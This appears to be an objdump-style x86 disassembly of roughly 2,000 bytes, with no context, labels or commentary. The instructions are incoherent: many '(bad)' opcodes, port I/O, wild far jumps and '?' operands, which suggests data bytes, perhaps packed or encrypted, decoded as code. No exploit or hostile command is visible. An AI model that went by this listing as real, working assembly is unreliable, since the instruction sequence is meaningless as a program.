  417ed6:	jle    0x417e9a
  417ed8:	inc    ebp
  417ed9:	pop    ecx
  417eda:	outs   dx,DWORD PTR ds:[esi]
  417edb:	test   al,0x14
  417edd:	jg     0x417eba
  417edf:	mov    bh,BYTE PTR [ecx]
  417ee1:	adc    BYTE PTR [ecx],dh
  417ee3:	add    eax,0x73c75170
  417ee8:	sbb    al,0x5e
  417eea:	push   edx
  417eeb:	sti    
  417eec:	mov    edx,DWORD PTR [edx-0x7b89504b]
  417ef2:	pop    es
  417ef3:	dec    esp
  417ef4:	jecxz  0x417f38
  417ef6:	fs or  eax,0xa685f7d6
  417efc:	ror    DWORD PTR [edi-0xbe73b85],cl
  417f02:	mul    DWORD PTR [ebp+0x25]
  417f05:	push   esp
  417f06:	addr16 mov al,es:0xb367
  417f0b:	inc    edx
  417f0c:	mov    BYTE PTR [edx],0x9f
  417f0f:	js     0x417e9b
  417f11:	sbb    eax,DWORD PTR [ebx]
  417f13:	stos   BYTE PTR es:[edi],al
  417f14:	xor    BYTE PTR [eax],ah
  417f16:	addr16 test al,0xaa
  417f19:	xor    al,0x86
  417f1b:	out    0xa7,eax
  417f1d:	inc    eax
  417f1e:	push   edx
  417f1f:	or     eax,edi
  417f21:	(bad)  
  417f22:	sub    esi,eax
  417f24:	ss mov cl,0x42
  417f27:	push   edi
  417f28:	jecxz  0x417ed2
  417f2a:	jg     0x417f07
  417f2c:	(bad)  
  417f2d:	pop    edi
  417f2e:	sbb    dl,0x33
  417f31:	jno    0x417ee1
  417f33:	inc    eax
  417f34:	sahf   
  417f35:	mov    BYTE PTR [edi+0x2a],cl
  417f38:	int    0x8
  417f3a:	lock mov al,0x8d
  417f3d:	xchg   esi,eax
  417f3e:	mov    eax,0xe0262860
  417f43:	lahf   
  417f44:	add    esp,DWORD PTR [ebp-0x3f]
  417f47:	sub    BYTE PTR [edx+0xd],dl
  417f4a:	jge    0x417f57
  417f4c:	mov    edi,esp
  417f4e:	outs   dx,BYTE PTR ds:[esi]
  417f4f:	aam    0x7a
  417f51:	stos   BYTE PTR es:[edi],al
  417f52:	movzx  eax,WORD PTR [ecx]
  417f55:	and    ch,BYTE PTR [ecx-0x34]
  417f58:	(bad)  
  417f59:	mov    ah,0x48
  417f5b:	push   0xffffffd1
  417f5d:	cmp    ecx,DWORD PTR [eax+0x11abe966]
  417f63:	mov    edi,0xeb973f5a
  417f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f69:	xor    ebx,DWORD PTR [eax+0x2f2ed34b]
  417f6f:	mov    eax,0x65dcb9c7
  417f74:	mov    ebp,0x2dd6fdfa
  417f79:	fxch   st(0)
  417f7b:	rol    DWORD PTR [ebx-0x60],1
  417f7e:	int    0x8e
  417f80:	icebp  
  417f81:	sub    eax,0x82c927ae
  417f86:	popf   
  417f87:	fwait
  417f88:	and    al,0x15
  417f8a:	adc    DWORD PTR [eax+0x2d],esi
  417f8d:	jno    0x417f98
  417f8f:	das    
  417f90:	fidiv  DWORD PTR [eax]
  417f92:	stos   BYTE PTR es:[edi],al
  417f93:	int3   
  417f94:	push   0x7854dc6b
  417f99:	pop    esi
  417f9a:	mov    cl,0xdd
  417f9c:	fldcw  WORD PTR [eax+esi*2+0x4a]
  417fa0:	nop
  417fa1:	aaa    
  417fa2:	in     al,dx
  417fa3:	xchg   edi,eax
  417fa4:	ret    0xa2b2
  417fa7:	je     0x417fe3
  417fa9:	xchg   ecx,eax
  417faa:	pop    ds
  417fab:	push   0xe50a082f
  417fb0:	mov    ebp,0x6ebb1707
  417fb5:	retf   
  417fb6:	outs   dx,DWORD PTR ds:[esi]
  417fb7:	aas    
  417fb8:	xchg   ebp,eax
  417fb9:	int3   
  417fba:	jmp    0x1080bb6a
  417fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fc0:	sahf   
  417fc1:	or     BYTE PTR ss:[ebx-0x34],bh
  417fc5:	and    BYTE PTR [eax],dl
  417fc7:	out    dx,al
  417fc8:	in     eax,dx
  417fc9:	adc    al,bh
  417fcb:	int3   
  417fcc:	add    cl,ch
  417fce:	dec    ebp
  417fcf:	add    BYTE PTR [ebp-0x50],dh
  417fd2:	jno    0x418018
  417fd4:	ja     0x417fc7
  417fd6:	xchg   DWORD PTR [edi+0x3],ebp
  417fd9:	repnz cmc 
  417fdb:	into   
  417fdc:	lods   eax,DWORD PTR ds:[esi]
  417fdd:	and    eax,0x1f344801
  417fe2:	jg     0x417fa5
  417fe4:	leave  
  417fe5:	add    dl,cl
  417fe7:	test   al,0x61
  417fe9:	popa   
  417fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417feb:	in     al,dx
  417fec:	jno    0x417fae
  417fee:	push   esp
  417fef:	das    
  417ff0:	mov    BYTE PTR [edi-0x114454a2],bl
  417ff6:	loopne 0x41804b
  417ff8:	pop    edi
  417ff9:	push   edx
  417ffa:	je     0x417fd2
  417ffc:	inc    edx
  417ffd:	mov    al,ds:0xc3112758
  418002:	je     0x417fc4
  418004:	add    BYTE PTR [esi-0x6a],bh
  418007:	push   0x6b
  418009:	and    BYTE PTR [eax-0x62449f97],0xe7
  418010:	cmp    edx,esi
  418012:	add    eax,0xde5f1b31
  418017:	mov    bh,0xb2
  418019:	inc    edx
  41801a:	jmp    0x2e471e5e
  41801f:	mov    ds:0x246773fb,eax
  418024:	mov    cl,0x7c
  418026:	sahf   
  418027:	or     DWORD PTR [eax+ebx*2+0x48],ebx
  41802b:	cmc    
  41802c:	stos   DWORD PTR es:[edi],eax
  41802d:	ins    BYTE PTR es:[edi],dx
  41802e:	mov    al,BYTE PTR [esi]
  418030:	ja     0x41803d
  418032:	xchg   edx,eax
  418033:	addr16 iret 
  418035:	(bad)  
  418036:	ror    BYTE PTR [esi],1
  418038:	push   0xdf478239
  41803d:	pop    esp
  41803e:	fucomp st(5)
  418040:	mov    ds:0x1439407d,al
  418045:	sbb    eax,0xc8ff567
  41804a:	jl     0x4180b0
  41804c:	sub    esp,DWORD PTR [ecx+edx*1+0x97a9944]
  418053:	sbb    BYTE PTR [edi],al
  418055:	shr    BYTE PTR [ebx+0x3b],0xd5
  418059:	scas   al,BYTE PTR es:[edi]
  41805a:	mov    DWORD PTR [edi],edx
  41805c:	cmp    eax,0x3d
  41805f:	mov    bl,0xe6
  418061:	dec    ebx
  418062:	ds sbb dh,bh
  418065:	add    bh,BYTE PTR [esi]
  418067:	popa   
  418068:	sbb    esi,DWORD PTR [eax+0x43]
  41806b:	(bad)  
  41806c:	lods   al,BYTE PTR ds:[esi]
  41806d:	mov    ebp,0xb7f08184
  418072:	frstor [eax]
  418074:	test   dh,ah
  418076:	xchg   ebx,eax
  418077:	jb     0x41805c
  418079:	(bad)  
  41807a:	jmp    0xc18ff845
  41807f:	out    dx,al
  418080:	addr16 pop esp
  418082:	(bad)  
  418083:	jmp    0x418087
  418085:	dec    eax
  418086:	ror    DWORD PTR [esi-0x5e8608c1],cl
  41808c:	jmp    0x4180af
  41808e:	in     al,dx
  41808f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418090:	lods   al,BYTE PTR ds:[esi]
  418091:	mov    ch,0xbe
  418093:	jb     0x4180ba
  418095:	test   eax,edx
  418097:	pop    ss
  418098:	push   ss
  418099:	lods   eax,DWORD PTR ds:[esi]
  41809a:	nop
  41809b:	test   al,0x97
  41809d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41809e:	mov    ah,bl
  4180a0:	jmp    0xa1e98b7
  4180a5:	in     al,dx
  4180a6:	loop   0x418060
  4180a8:	pusha  
  4180a9:	sbb    cl,cl
  4180ab:	mov    al,0x85
  4180ad:	(bad)  
  4180ae:	daa    
  4180af:	xor    bh,dh
  4180b1:	sahf   
  4180b2:	fs pop eax
  4180b4:	pusha  
  4180b5:	cdq    
  4180b6:	sbb    eax,0x50f22db9
  4180bb:	dec    edx
  4180bc:	dec    edx
  4180bd:	scas   al,BYTE PTR es:[edi]
  4180be:	mov    WORD PTR [edx-0x4eeb3c5f],ss
  4180c4:	jnp    0x41808d
  4180c6:	adc    al,0x61
  4180c8:	lds    esi,FWORD PTR [esp+eiz*4]
  4180cb:	mov    bh,0xe1
  4180cd:	mov    bh,dh
  4180cf:	daa    
  4180d0:	pop    ds
  4180d1:	jmp    0x6716:0xc8e7f24f
  4180d8:	adc    eax,0xade5d367
  4180dd:	call   0x8cca:0x446b20d2
  4180e4:	xchg   DWORD PTR [ebx+0x5b5954f7],esi
  4180ea:	sub    BYTE PTR [eax],0xb3
  4180ed:	and    al,0x7c
  4180ef:	dec    edx
  4180f0:	mov    ch,0x7a
  4180f2:	stc    
  4180f3:	jb     0x4180c3
  4180f5:	push   esp
  4180f6:	sub    bh,0x7
  4180f9:	call   0xf4e9:0x174b0f40
  418100:	call   0x46a9:0x21999c19
  418107:	loop   0x4180a8
  418109:	mov    ebx,0xc9624076
  41810e:	clc    
  41810f:	sub    eax,edx
  418111:	ins    BYTE PTR es:[edi],dx
  418112:	jnp    0x4180a9
  418114:	xor    BYTE PTR [edx-0x415f1e30],bh
  41811a:	rol    dl,1
  41811c:	mov    BYTE PTR [ebx+0x2],dh
  41811f:	stc    
  418120:	mov    eax,ds:0xa50c88fe
  418125:	aad    0xd3
  418127:	loop   0x4180cf
  418129:	dec    ebx
  41812a:	fst    DWORD PTR [ecx+0x17]
  41812d:	or     eax,0xd5c067c5
  418132:	add    ah,BYTE PTR [ebx+0x25]
  418135:	sub    esp,eax
  418137:	imul   esp,DWORD PTR [edi+0x2670a11f],0x0
  41813e:	cli    
  41813f:	mov    ebp,0x87a46ba6
  418144:	int3   
  418145:	pop    esp
  418146:	shl    BYTE PTR [ecx+ebp*8],0xc8
  41814a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41814b:	popf   
  41814c:	mov    esp,0x9e53404e
  418151:	js     0x418131
  418153:	sbb    esi,ecx
  418155:	fdivr  QWORD PTR [edi-0x77]
  418158:	or     al,0xd
  41815a:	jnp    0x4180ea
  41815c:	imul   esi,DWORD PTR [ecx-0x3368afec],0x4479b869
  418166:	test   bl,0xb4
  418169:	mov    ds:0x61483d6d,eax
  41816e:	pusha  
  41816f:	mov    cl,0xe5
  418171:	inc    ebx
  418172:	xchg   esp,eax
  418173:	cmp    eax,0x32b63e76
  418178:	cmp    ch,BYTE PTR [edi+ebp*2-0x3e3e7c98]
  41817f:	repz xchg edi,eax
  418181:	xor    al,0xfc
  418183:	mov    BYTE PTR [eax+eiz*1+0x64],bh
  418187:	lea    esi,[edi+0x57bdf2a]
  41818d:	cs dec esi
  41818f:	test   eax,0xe3919059
  418194:	in     al,dx
  418195:	mov    esp,0x7c730bdb
  41819a:	and    DWORD PTR [ebp+0x7e],0xffffffbd
  41819e:	push   ecx
  41819f:	in     eax,0x11
  4181a1:	ret    0xbdd6
  4181a4:	fisub  DWORD PTR [ecx+0x35bc7e7c]
  4181aa:	sti    
  4181ab:	add    al,0x70
  4181ad:	dec    ebp
  4181ae:	cwde   
  4181af:	xchg   ecx,eax
  4181b0:	and    BYTE PTR [edx],al
  4181b2:	(bad)  
  4181b3:	jecxz  0x41815f
  4181b5:	sub    eax,0xd9176dd8
  4181ba:	sub    eax,0xc1cf5773
  4181bf:	mov    eax,esi
  4181c1:	popa   
  4181c2:	(bad)  
  4181c3:	mov    esi,?
  4181c5:	bound  edx,QWORD PTR [esi]
  4181c7:	mov    edi,0xd30970ba
  4181cc:	popa   
  4181cd:	push   ebp
  4181ce:	mov    al,ds:0xe94a9b5a
  4181d3:	mov    DWORD PTR [ebx+eax*1+0x3b],esi
  4181d7:	loope  0x418196
  4181d9:	outs   dx,BYTE PTR ds:[esi]
  4181da:	push   ss
  4181db:	and    cl,BYTE PTR [ecx+0x64]
  4181de:	and    BYTE PTR [edi],ah
  4181e0:	fist   DWORD PTR [esi-0x5fe2690f]
  4181e6:	inc    ecx
  4181e7:	repz add bh,dl
  4181ea:	push   ebx
  4181eb:	loopne 0x4181c3
  4181ed:	and    BYTE PTR [edx+0x55],0xf2
  4181f1:	xchg   ebp,eax
  4181f2:	sub    BYTE PTR ds:0x688e4643,ch
  4181f8:	jno    0x418261
  4181fa:	and    DWORD PTR [edx+0x7c],ebp
  4181fd:	mov    eax,0x3eb86f69
  418202:	js     0x41819b
  418204:	popa   
  418205:	pop    es
  418206:	mov    bh,0x1e
  418208:	(bad)  
  418209:	adc    BYTE PTR ds:0xe3d994c7,dh
  41820f:	pop    esp
  418210:	sub    ebp,DWORD PTR [edi+0x3504ec49]
  418216:	or     al,bh
  418218:	jns    0x4181e5
  41821a:	dec    ecx
  41821b:	sahf   
  41821c:	adc    DWORD PTR [edx+0x53],edx
  41821f:	fsubr  st,st(5)
  418221:	inc    ecx
  418222:	xchg   ebx,eax
  418223:	fwait
  418224:	pop    ds
  418225:	xor    dh,BYTE PTR [esi-0x7d]
  418228:	jb     0x4181fb
  41822a:	xchg   ecx,eax
  41822b:	out    0xf7,eax
  41822d:	xchg   ebx,eax
  41822e:	cmp    DWORD PTR [ebx],0xffffffc5
  418231:	or     al,BYTE PTR [ecx]
  418233:	jae    0x41820c
  418235:	xchg   BYTE PTR [ecx+0x23c789fd],dl
  41823b:	cmp    al,0xa7
  41823d:	adc    ebx,DWORD PTR [eax+ebp*8]
  418240:	mov    BYTE PTR [edi+0x5dbbb18d],bl
  418246:	pop    esp
  418247:	daa    
  418248:	aam    0x67
  41824a:	sbb    esp,DWORD PTR [ecx*1+0x7d1034a4]
  418251:	adc    al,0x4d
  418253:	lahf   
  418254:	mov    ah,0xc9
  418256:	js     0x41821d
  418258:	aam    0x65
  41825a:	add    al,0xe0
  41825c:	adc    DWORD PTR ds:0xb0fbf160,esp
  418262:	jmp    0x1b2a93bd
  418267:	cs push cs
  418269:	lods   eax,DWORD PTR ds:[esi]
  41826a:	mov    DWORD PTR [ecx+edx*4+0x1c211d6b],ecx
  418271:	push   di
  418273:	fidiv  DWORD PTR [ebx-0x45dd9cb2]
  418279:	xchg   edx,eax
  41827a:	dec    edi
  41827b:	xchg   DWORD PTR [ebx+0x10],edi
  41827e:	mov    esi,DWORD PTR [edx+0x3b26f349]
  418284:	push   cs
  418285:	xor    bl,dl
  418287:	scas   al,BYTE PTR es:[edi]
  418288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418289:	or     BYTE PTR [eax+0x78],ah
  41828c:	cmp    al,0xef
  41828e:	and    eax,0x4310aa13
  418293:	popa   
  418294:	cmp    ebx,DWORD PTR [edx]
  418296:	inc    eax
  418297:	dec    ebx
  418298:	lds    edx,FWORD PTR [ecx+0x45]
  41829b:	sar    BYTE PTR [ebp-0x72f8e81a],0x3e
  4182a2:	inc    ecx
  4182a3:	mov    BYTE PTR [esi-0x1110c769],0x75
  4182aa:	jo     0x4182fe
  4182ac:	xor    DWORD PTR [eax],eax
  4182ae:	mov    eax,ds:0x5e8f3683
  4182b3:	cs jmp 0x2253:0x198eecd1
  4182bb:	mov    ?,WORD PTR [edx]
  4182bd:	xchg   ebp,eax
  4182be:	push   di
  4182c0:	retf   
  4182c1:	inc    esp
  4182c2:	jg     0x418267
  4182c4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4182c6:	xor    esp,esp
  4182c8:	fwait
  4182c9:	int    0xa4
  4182cb:	mov    ebp,0x2b824527
  4182d0:	mov    esp,0x96f9601c
  4182d5:	imul   ecx,DWORD PTR [esi+0xd],0xffffffd8
  4182d9:	jbe    0x41830e
  4182db:	retf   
  4182dc:	sbb    DWORD PTR ds:[ebx+edx*4+0x72ee15eb],0xfffffffc
  4182e5:	mov    eax,ds:0xe94c5712
  4182ea:	loope  0x41829f
  4182ec:	sub    DWORD PTR [esi-0x11dca83f],eax
  4182f2:	adc    eax,0x71d7d21f
  4182f7:	xlat   BYTE PTR ds:[ebx]
  4182f8:	call   0xdb928559
  4182fd:	lods   eax,DWORD PTR ds:[esi]
  4182fe:	push   eax
  4182ff:	rcr    BYTE PTR [ebx+0x6c7f9ca],0xf9
  418306:	and    dh,BYTE PTR [ebp+0x17417b09]
  41830c:	or     edx,DWORD PTR [ebx-0x104fc821]
  418312:	(bad)  
  418314:	dec    ebp
  418315:	hlt    
  418316:	push   0x39
  418318:	repnz sub DWORD PTR [esi+edi*4],ebx
  41831c:	or     DWORD PTR [edi],ebx
  41831e:	repnz pop esi
  418320:	mov    edx,0xc32728fa
  418325:	out    0x2f,eax
  418327:	adc    eax,0xe3f6c119
  41832c:	pop    es
  41832d:	dec    ebx
  41832e:	adc    edx,DWORD PTR [eax+0xe80b011]
  418334:	push   ss
  418335:	shr    DWORD PTR [eax],1
  418337:	push   0x5e532c4f
  41833c:	rcr    BYTE PTR [ebx-0x18d55b32],0xf6
  418343:	repnz push edx
  418345:	test   DWORD PTR [eax+0x6d],ebx
  418348:	adc    eax,0x5bae134e
  41834d:	aaa    
  41834e:	jno    0x418336
  418350:	ret    0x73e2
  418353:	xor    eax,0xab41d41b
  418358:	pop    esi
  418359:	jp     0x4183d7
  41835b:	outs   dx,BYTE PTR ds:[esi]
  41835c:	xchg   BYTE PTR [eax-0x4],ch
  41835f:	push   ebx
  418360:	dec    edi
  418361:	test   BYTE PTR [ebx+0x29],0x3d
  418365:	les    ebp,FWORD PTR [esi-0x329d8aac]
  41836b:	rep outs dx,BYTE PTR ds:[esi]
  41836d:	inc    ebp
  41836e:	pop    ebx
  41836f:	xchg   edi,eax
  418370:	mov    eax,esp
  418372:	lods   eax,DWORD PTR ds:[esi]
  418373:	jecxz  0x418344
  418375:	jne    0x41839c
  418377:	les    ecx,FWORD PTR [ebx-0x64]
  41837a:	mov    esi,0x775a17c
  41837f:	jecxz  0x4183fb
  418381:	jno    0x4183c6
  418383:	sub    BYTE PTR [edi],0x3e
  418386:	in     al,dx
  418387:	cmp    DWORD PTR [ecx-0x61],0x5f
  41838b:	fldenv [ecx+0x77d0e430]
  418391:	mov    ebp,DWORD PTR [esi+0x19]
  418394:	and    ebx,DWORD PTR [edx+0x42]
  418397:	jl     0x4183c4
  418399:	test   eax,0x421777d
  41839e:	cmp    BYTE PTR [edx+0x3ff77b61],ch
  4183a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183a6:	mov    ds:0xa36d3e06,al
  4183ab:	jae    0x41838a
  4183ad:	sub    al,0x30
  4183af:	mov    esp,0xdb0d9ca7
  4183b4:	cdq    
  4183b5:	add    DWORD PTR [esi+0x21c2ba07],ebp
  4183bb:	push   edi
  4183bc:	dec    ecx
  4183bd:	mov    ecx,0x3109ade5
  4183c2:	je     0x4183b1
  4183c4:	mov    ecx,0x7947b423
  4183c9:	sbb    eax,DWORD PTR [ecx-0x25941e4d]
  4183cf:	sbb    eax,0x33db17ba
  4183d4:	add    ebp,DWORD PTR [esi]
  4183d6:	into   
  4183d7:	cdq    
  4183d8:	mov    ah,0x5e
  4183da:	pop    es
  4183db:	fisttp DWORD PTR [esi-0x2a]
  4183de:	jecxz  0x4183a0
  4183e0:	jmp    0x3851:0xcc4327b5
  4183e7:	dec    esi
  4183e8:	sbb    bl,0x22
  4183eb:	xchg   ebx,eax
  4183ec:	mov    al,bh
  4183ee:	push   es
  4183ef:	ret    0xd6a5
  4183f2:	leave  
  4183f3:	dec    ebp
  4183f4:	mov    ds,WORD PTR [edi+esi*8-0x76]
  4183f8:	(bad)  
  4183f9:	mov    esp,0x1ded5670
  4183fe:	xlat   BYTE PTR ds:[ebx]
  4183ff:	push   ebx
  418400:	mov    ah,0xb0
  418402:	imul   esp,DWORD PTR [ebx],0xffffffa6
  418405:	lods   eax,DWORD PTR ds:[esi]
  418406:	ins    BYTE PTR es:[edi],dx
  418407:	inc    esp
  418408:	addr16 into 
  41840a:	loopne 0x418450
  41840c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41840d:	scas   al,BYTE PTR es:[edi]
  41840e:	pop    esp
  41840f:	dec    edi
  418410:	sub    bl,BYTE PTR [edi]
  418412:	and    eax,0xc54c38bb
  418417:	push   es
  418418:	pop    esi
  418419:	inc    ebp
  41841a:	test   eax,0x483bf10e
  41841f:	sub    BYTE PTR [esi],ch
  418421:	mov    ebx,0x95381fdf
  418426:	pop    ecx
  418427:	ss call 0xb5405567
  41842d:	jmp    0xe1267404
  418432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418433:	pusha  
  418434:	jnp    0x4184a0
  418436:	mov    cl,0x13
  418438:	je     0x41846a
  41843a:	(bad)  
  41843b:	cld    
  41843c:	test   DWORD PTR [edi+0x724d0915],ebp
  418442:	leave  
  418443:	sub    al,0x35
  418445:	xchg   bh,ch
  418447:	and    ecx,edi
  418449:	ja     0x418479
  41844b:	lods   eax,DWORD PTR ds:[esi]
  41844c:	mov    eax,0xcf2db8f4
  418451:	(bad)  
  418452:	and    eax,0x8b7c4a4f
  418457:	dec    ebx
  418458:	pop    edx
  418459:	mov    esi,0xfaa3f717
  41845e:	xchg   ebx,eax
  41845f:	sub    eax,0x8129c3ff
  418464:	sub    edx,DWORD PTR [ebp+0x71d927a]
  41846a:	add    DWORD PTR [ebx],esp
  41846c:	xchg   ebp,eax
  41846d:	adc    BYTE PTR [edx],ch
  41846f:	xchg   esi,eax
  418470:	cli    
  418471:	cmp    eax,0xe5cac4cb
  418476:	cmp    eax,0x53a2d3d5
  41847b:	ror    BYTE PTR [ecx-0xe37ad7b],1
  418481:	outs   dx,DWORD PTR ds:[esi]
  418482:	fnstenv [ebx-0x1d]
  418485:	pop    esi
  418486:	inc    edx
  418487:	aaa    
  418488:	and    DWORD PTR [ecx+0x47],esp
  41848b:	mov    BYTE PTR [edi+ebx*1-0xe07ea5a],ch
  418492:	loopne 0x4184d6
  418494:	les    ebp,FWORD PTR [esi+eax*4-0x12]
  418498:	jecxz  0x418467
  41849a:	xor    edi,DWORD PTR [eax]
  41849c:	mov    esi,0x5e9476da
  4184a1:	dec    ecx
  4184a2:	jnp    0x41848a
  4184a4:	mov    ah,0x1e
  4184a6:	jbe    0x4184a7
  4184a8:	jnp    0x4184bf
  4184aa:	std    
  4184ab:	cli    
  4184ac:	mov    ah,0x1d
  4184ae:	push   ss
  4184af:	mov    esp,ecx
  4184b1:	push   cs
  4184b2:	pop    edi
  4184b3:	mov    dl,0xcd
  4184b5:	scas   al,BYTE PTR es:[edi]
  4184b6:	pop    ds
  4184b7:	pop    ss
  4184b8:	mov    WORD PTR [ecx],?
  4184ba:	ds adc eax,eax
  4184bd:	and    cl,dh
  4184bf:	popf   
  4184c0:	sub    BYTE PTR [edx+ecx*1+0x5dc2847f],ch
  4184c7:	mov    ?,WORD PTR [ebp+ecx*4+0x60]
  4184cb:	push   0x3af2ff87
  4184d0:	cs pop edi
  4184d2:	cmp    cl,ch
  4184d4:	nop
  4184d5:	jae    0x41854f
  4184d7:	int    0x9b
  4184d9:	fs push ebp
  4184db:	cmp    esp,DWORD PTR [eax]
  4184dd:	mov    WORD PTR [ebx+ecx*4],cs
  4184e0:	adc    dl,0x73
  4184e3:	jle    0x4184aa
  4184e5:	in     eax,0x7
  4184e7:	fsub   DWORD PTR [ebp-0x39055270]
  4184ed:	jle    0x418517
  4184ef:	inc    edx
  4184f0:	xchg   ecx,eax
  4184f1:	push   eax
  4184f2:	jae    0x4184a1
  4184f4:	out    dx,al
  4184f5:	and    BYTE PTR [edx+0x27],cl
  4184f8:	rol    ah,1
  4184fa:	hlt    
  4184fb:	fwait
  4184fc:	push   ds
  4184fd:	sub    dl,bl
  4184ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418500:	sar    BYTE PTR [ebp+0x38],1
  418503:	sbb    edx,DWORD PTR [edi+0x214de83b]
  418509:	out    0x31,al
  41850b:	std    
  41850c:	pushf  
  41850d:	push   ds
  41850e:	stos   DWORD PTR es:[edi],eax
  41850f:	mov    edi,0x2e5e919d
  418514:	push   ebp
  418515:	mov    BYTE PTR [ecx+0x3],cl
  418518:	and    bl,BYTE PTR [ebx+0x6c]
  41851b:	ret    
  41851c:	mov    edi,0x8fafa998
  418521:	jno    0x41850f
  418523:	aaa    
  418524:	sub    ebx,DWORD PTR [edx]
  418526:	sbb    esp,DWORD PTR [edx]
  418528:	or     bh,0x5a
  41852b:	mov    esi,0x2bac857f
  418530:	(bad)  
  418531:	shl    ebx,cl
  418533:	mov    dh,0x57
  418535:	and    al,BYTE PTR [edx+edi*2]
  418538:	sbb    BYTE PTR [ecx-0x29],bh
  41853b:	sar    BYTE PTR [ebx-0x2f435918],cl
  418541:	mov    DWORD PTR [edi+0xb],ebp
  418544:	sub    al,0xe0
  418546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418547:	or     dh,BYTE PTR [eax+0x26d82912]
  41854d:	lods   eax,DWORD PTR ds:[esi]
  41854e:	push   0xffffffbb
  418550:	add    esi,DWORD PTR [edi+0x70bb0a27]
  418556:	push   ds
  418557:	std    
  418558:	aad    0xaf
  41855a:	mov    edx,0x20f9c1f1
  41855f:	cwde   
  418560:	jno    0x4185bd
  418562:	clc    
  418563:	call   0x211a:0xde580803
  41856a:	rcl    BYTE PTR [eax-0x6a],cl
  41856d:	xor    ecx,DWORD PTR [edi-0x54f1816b]
  418573:	sub    al,0xe9
  418575:	aas    
  418576:	outs   dx,BYTE PTR ds:[esi]
  418577:	mov    esi,esp
  418579:	test   DWORD PTR [ecx+0x50b8acaa],edx
  41857f:	mov    eax,0xbd23249f
  418584:	sbb    DWORD PTR [edi+0x59],esi
  418587:	aas    
  418588:	out    0xb1,al
  41858a:	pop    edx
  41858b:	push   cs
  41858c:	repnz in al,0x28
  41858f:	push   edx
  418590:	(bad)
  418593:	cmp    al,0xb1
  418595:	ror    DWORD PTR [eax+edi*1],cl
  418598:	jnp    0x41858b
  41859a:	sar    BYTE PTR [edx+0x41d96ecd],cl
  4185a0:	out    dx,eax
  4185a1:	inc    ecx
  4185a2:	int    0x73
  4185a4:	lea    eax,ds:0x69bdf364
  4185aa:	jne    0x4185ea
  4185ac:	cmp    BYTE PTR [ebp-0x509102b6],bl
  4185b2:	mul    BYTE PTR [edx+0x5c]
  4185b5:	xor    eax,eax
  4185b7:	mov    bh,0x31
  4185b9:	nop
  4185ba:	push   ebx
  4185bb:	lds    ebx,FWORD PTR [ebx]
  4185bd:	rol    ebp,1
  4185bf:	xor    DWORD PTR [esp+ebp*8-0x1a],0xf7d98ec7
  4185c7:	mov    bh,0x57
  4185c9:	nop
  4185ca:	aas    
  4185cb:	pop    ebp
  4185cc:	out    0x6b,eax
  4185ce:	cdq    
  4185cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d0:	ror    BYTE PTR [ebx-0x4fcd6cb1],cl
  4185d6:	cs dec esp
  4185d8:	mov    ch,0x78
  4185da:	popf   
  4185db:	inc    esi
  4185dd:	fidivr DWORD PTR [esi]
  4185df:	and    DWORD PTR [ecx+0x3955cd78],ecx
  4185e5:	adc    ax,ax
  4185e8:	dec    ebx
  4185e9:	mov    dh,0x57
  4185eb:	and    al,0x53
  4185ed:	adc    BYTE PTR [eax],dl
  4185ef:	push   edx
  4185f0:	fst    st(1)
  4185f2:	(bad)  
  4185f3:	cli    
  4185f4:	cwde   
  4185f5:	sar    DWORD PTR [eax+0x7c76369a],1
  4185fb:	pushf  
  4185fc:	push   ds
  4185fd:	lahf   
  4185fe:	mov    al,ds:0x70f11c73
  418603:	jmp    0x36a091ca
  418608:	call   0x2e6f818f
  41860d:	sub    esi,edi
  41860f:	and    al,0xdb
  418611:	cmp    BYTE PTR [edx+0x2bcc9153],cl
  418617:	and    ch,BYTE PTR [ecx]
  418619:	dec    eax
  41861a:	imul   eax,DWORD PTR [esi+0x3e],0x46fbd0b3
  418621:	jns    0x4185c1
  418623:	mov    ebp,0x43e3b23a
  418628:	fcmovb st,st(2)
  41862a:	mov    al,0xea
  41862c:	mov    edx,0xcd8eb094
  418631:	shl    DWORD PTR [eax+0x4f],1
  418634:	pop    esi
  418635:	mov    ?,ebx
  418637:	push   ds
  418638:	jno    0x41866b
  41863a:	retf   
  41863b:	jae    0x4186bb
  41863d:	setae  BYTE PTR ds:0x80217dc1
  418644:	push   0xffffffb8
  418646:	imul   edi,DWORD PTR ds:0x3a28fcfd,0x6ceffe37
  418650:	imul   edx,ebp,0xfffffffc
  418653:	push   0xffffff95
  418655:	rol    DWORD PTR [ebp-0x8a8df4e],0x8b
  41865c:	pop    edi
  41865d:	cmc    
  41865e:	jle    0x41867d
  418660:	mov    al,0x9c
  418662:	jmp    0x4185f1
  418664:	pop    eax
  418665:	sub    ebx,DWORD PTR ds:0x49337df5
  41866b:	xchg   BYTE PTR [edx],al
  41866d:	outs   dx,BYTE PTR ds:[esi]
  41866e:	popa   
  41866f:	mov    bl,0x62
  418671:	dec    esp
  418672:	mov    ebp,0x8416ba6a
  418677:	jle    0x418679
  418679:	lea    ecx,[eax+0x6fb343bd]
  41867f:	pop    ebx
  418680:	stos   BYTE PTR es:[edi],al
  418681:	sub    al,0xcc
  418683:	push   ebp
  418684:	dec    ecx
  418685:	jmp    0xd257ccdb
  41868a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41868b:	call   0x32ca5880
  418690:	sbb    BYTE PTR [esi],bl
  418692:	push   es
  418693:	aaa    
  418694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418695:	dec    ecx
  418696:	and    ah,BYTE PTR [ecx+ebp*2]
  418699:	pop    esp
  41869a:	ds push ss
  41869c:	(bad)  
  41869d:	lds    esp,FWORD PTR [ebx+0x37a34793]
  4186a3:	push   edi
